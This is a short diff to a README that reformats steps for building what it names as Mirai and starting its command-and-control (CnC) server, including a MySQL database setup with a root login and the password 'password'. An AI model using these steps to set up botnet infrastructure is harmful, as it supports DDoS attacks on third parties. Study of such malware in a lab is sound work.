@@ -35,9 +35,11 @@ steps to setup build environment
  - cd /vagrant/mirai
  - ./build.sh
 
-Steps to create database
-cat Configure_CNC_Database.txt | mysql -u root --password=password
+Steps to create database:
+`cat Configure_CNC_Database.txt | mysql -u root --password=password`
 
 Start the CnC
-make a prompt file in ./release
+- make a prompt file in ./release
+- `cd ./release`
+- `sudo ./cnc`
 
